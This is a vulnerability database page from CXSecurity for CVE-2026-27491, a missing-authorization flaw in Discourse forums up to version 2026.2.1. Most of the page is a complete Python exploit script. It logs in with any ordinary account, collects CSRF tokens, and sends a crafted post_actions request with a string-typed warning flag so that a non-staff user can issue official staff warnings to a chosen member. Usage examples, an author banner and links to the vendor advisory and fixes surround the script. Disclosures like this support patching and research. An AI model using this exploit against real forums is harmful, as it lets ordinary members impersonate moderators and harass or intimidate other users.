---
title: Discourse < = 2026.2.1 Authenticated Missing Authorization
url: https://cxsecurity.com/issue/WLB-2026030028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-21
fetch_date: 2026-03-22T04:18:24.346528
---

# Discourse < = 2026.2.1 Authenticated Missing Authorization

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Discourse <= 2026.2.1 Authenticated Missing Authorization** **2026.03.21**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-27491](https://cxsecurity.com/cveshow/CVE-2026-27491/ "Click to see CVE-2026-27491")**  CWE: **[CWE-862 (Missing Authorization)](https://cxsecurity.com/cwe/CWE-862%20%28Missing%20Authorization%29 "Click to see CWE-862 (Missing Authorization)")** | |

#!/usr/bin/env python3
# Exploit Title: Discourse <= 2026.2.1 Authenticated Missing Authorization (Official Warnings Bypass)
# CVE: CVE-2026-27491
# Date: 2026-03-21
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://www.discourse.org
# Software Link: https://github.com/discourse/discourse
# Affected: Discourse <= 2026.2.1 (and earlier unpatched releases in 2026.x / 3.2.x branches)
# Tested on: Discourse 3.2.x (pre-patch)
# Category: Webapps
# Platform: Ruby on Rails
# Exploit Type: Remote Authorization Bypass
# CVSS: 6.5 (Medium) – AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
# CWE: CWE-862
# Description: Authenticated non-staff users can issue official staff warnings to other users
# by abusing type coercion in the post\_actions endpoint (notify\_user action).
# Fixed in: 2026.1.2, 2026.2.1, 2026.3.0-latest.1
# Usage:
# python3 exploit.py <target\_url> --username <user> --password <pass> --target-user-id <id> --post-id <post\_id>
#
# Examples:
# python3 exploit.py https://forum.example.com --username regular --password pass123 \
# --target-user-id 456 --post-id 7890
#
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-27491 • Discourse → Issue Official Warnings as Non-Staff ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import argparse
import requests
import sys
from urllib.parse import urljoin
def get\_csrf(session, base\_url):
r = session.get(urljoin(base\_url, "/session/csrf"))
if r.status\_code != 200:
print("[-] Failed to fetch CSRF token")
sys.exit(1)
data = r.json()
csrf = data.get("csrf")
if not csrf:
print("[-] CSRF token not found")
sys.exit(1)
return csrf
def login(session, base\_url, username, password):
csrf = get\_csrf(session, base\_url)
login\_url = urljoin(base\_url, "/session")
payload = {
"login": username,
"password": password,
"second\_factor\_method": 1,
"value": "",
"use\_another\_method": False,
"remember\_me": False,
"csrf": csrf
}
r = session.post(login\_url, json=payload)
if r.status\_code != 200 or not r.json().get("success"):
print("[-] Login failed - check credentials")
sys.exit(1)
print("[+] Login successful")
return get\_csrf(session, base\_url) # refresh csrf after login
def issue\_warning(session, base\_url, post\_id, target\_user\_id, message):
csrf = get\_csrf(session, base\_url)
url = urljoin(base\_url, "/post\_actions")
payload = {
"id": post\_id,
"post\_action\_type\_id": 4, # notify\_user
"message": message,
"is\_warning": "true", # string that triggered the bypass
"username": f"user\_{target\_user\_id}",
"take\_action": True,
"csrf": csrf
}
headers = {
"X-CSRF-Token": csrf,
"Accept": "application/json, \*/\*",
"Content-Type": "application/json"
}
r = session.post(url, json=payload, headers=headers)
if r.status\_code == 200 and "success" in r.text.lower():
print("[+] SUCCESS: Official warning sent!")
print(f" → Target user ID: {target\_user\_id}")
print(f" → Message: {message}")
print(" → Should now appear in target user's inbox as staff warning")
else:
print(f"[-] Failed ({r.status\_code})")
try:
print(r.json())
except:
print(r.text[:400])
def main():
parser = argparse.ArgumentParser(
description="CVE-2026-27491 PoC - Discourse non-staff official warning bypass"
)
parser.add\_argument("target", help="Target Discourse URL (e.g. https://forum.example.com)")
parser.add\_argument("--username", required=True, help="Non-staff username")
parser.add\_argument("--password", required=True, help="Password")
parser.add\_argument("--target-user-id", type=int, required=True, help="User ID to send warning to")
parser.add\_argument("--post-id", type=int, required=True, help="Any post ID visible to the account")
parser.add\_argument("--message", default="This is an unauthorized official warning test", help="Warning text")
args = parser.parse\_args()
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 (PoC)"})
print(f"[\*] Target: {args.target}")
login(s, args.target, args.username, args.password)
print(f"[\*] Attempting to issue warning to user ID {args.target\_user\_id} via post {args.post\_id}")
issue\_warning(s, args.target, args.post\_id, args.target\_user\_id, args.message)
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/discourse/discourse/security/advisories/GHSA-xq37-5fvf-4m4j

https://github.com/discourse/discourse/commit/d3cb203feabc46d765ecb91f348613a2bd531b89

https://github.com/discourse/discourse/commit/60a588f4da4ab0feceb2c44787d4261b4f8757be

https://github.com/discourse/discourse/commit/f5fef73827da7520efc517357bd2a6bab35d7886

https://nvd.nist.gov/vuln/detail/CVE-2026-27491

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030028)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Emai...